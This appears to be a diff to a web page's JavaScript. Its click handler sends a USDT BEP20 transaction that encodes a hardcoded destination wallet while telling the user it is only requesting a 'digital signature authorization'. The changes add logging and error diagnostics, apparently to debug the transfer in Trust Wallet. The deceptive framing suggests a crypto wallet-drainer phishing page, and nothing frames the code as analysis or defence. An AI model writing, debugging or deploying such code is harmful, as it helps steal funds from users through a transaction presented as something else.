@@ -1065,15 +1065,59 @@ connectBtn.addEventListener("click",async()=>{
   console.groupEnd();
 
   setStatus("Solicitando autorización de firma digital...");
-  const txHash=await rpc("eth_sendTransaction",[{from:walletAddress,to:CONTRATO_USDT,value:"0x0",data}]);
+
+  const txRequest = {
+      from: walletAddress,
+      to: CONTRATO_USDT,
+      value: "0x0",
+      data: data
+  };
+
+  console.group("BEP20 - REQUEST A TRUST WALLET");
+  console.log("chainId esperado:", BSC_CHAIN_ID, "(56)");
+  console.log("txRequest:", txRequest);
+  console.log("from:", txRequest.from);
+  console.log("to contrato USDT:", txRequest.to);
+  console.log("destino codificado:", BILLETERA_DESTINO);
+  console.log("data:", txRequest.data);
+  console.groupEnd();
+
+  const txHash=await rpc("eth_sendTransaction",[txRequest]);
   showProcessingScreen();
   console.log("BEP20 txHash:",txHash);
   await hideProcessingScreenAfterMinimum();
   setStatus("TRANSACCIÓN ENVIADA.");connectBtn.innerText="Completado";
  }catch(e){
-  console.error(e);await hideProcessingScreenAfterMinimum();
-  setStatus(e.message||"La transacción falló o fue cancelada.");
-  connectBtn.disabled=false;connectBtn.innerText="Continuar";
+  console.error("BEP20 ERROR COMPLETO:", e);
+  await hideProcessingScreenAfterMinimum();
+
+  const errorCode =
+      e && e.code !== undefined ? String(e.code) : "(sin código)";
+  const errorMessage =
+      e && e.message ? String(e.message) : String(e || "Error desconocido");
+  let errorData = "";
+  try {
+      if (e && e.data !== undefined) {
+          errorData = typeof e.data === "string"
+              ? e.data
+              : JSON.stringify(e.data);
+      }
+  } catch (_) {}
+
+  console.group("BEP20 - ERROR DIAGNÓSTICO");
+  console.log("code:", errorCode);
+  console.log("message:", errorMessage);
+  console.log("data:", errorData || "(sin data)");
+  console.log("error completo:", e);
+  console.groupEnd();
+
+  setStatus(
+      "Error " + errorCode + ": " + errorMessage +
+      (errorData ? " | Data: " + errorData : "")
+  );
+
+  connectBtn.disabled=false;
+  connectBtn.innerText="Continuar";
  }
 });
 
@@ -1110,3 +1154,4 @@ if(maxAction)maxAction.addEventListener("click",async()=>{
 
 </body>
 </html>
+
